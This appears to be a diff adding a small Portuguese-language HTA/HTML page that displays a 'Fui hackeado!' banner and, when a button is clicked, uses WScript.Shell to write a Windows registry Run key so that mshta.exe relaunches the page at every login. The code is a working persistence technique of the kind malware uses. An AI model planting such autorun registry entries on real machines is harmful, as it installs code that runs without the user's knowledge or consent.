@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+  <title>Auto Executado</title>
+<h1 style="color:red;">Fui hackeado! Estou lixado fui craqueado.</h1>
+<h2>Executar html adicionado ao sistema salvo em .hta</h2>
+
+<div>
+<img src="https://th.bing.com/th/id/OIP.K9GMrBLSXqqJJKdUXAorxQHaE8?r=0&rs=1&pid=ImgDetMain"width="400px">
+</div>
+  <script>
+    function autoExecutar() {
+      var shell = new ActiveXObject("WScript.Shell");
+      shell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AutoExecutado", "mshta.exe \"file://" + window.location.href + "\"");
+      alert("Configurado para executar automaticamente!");
+    }
+  </script>
+</head>
+<body>
+  <h1>HTML Auto Executado</h1>
+  <button onclick="autoExecutar()">Clique aqui para configurar auto-execução</button>
+</body>
+</html>
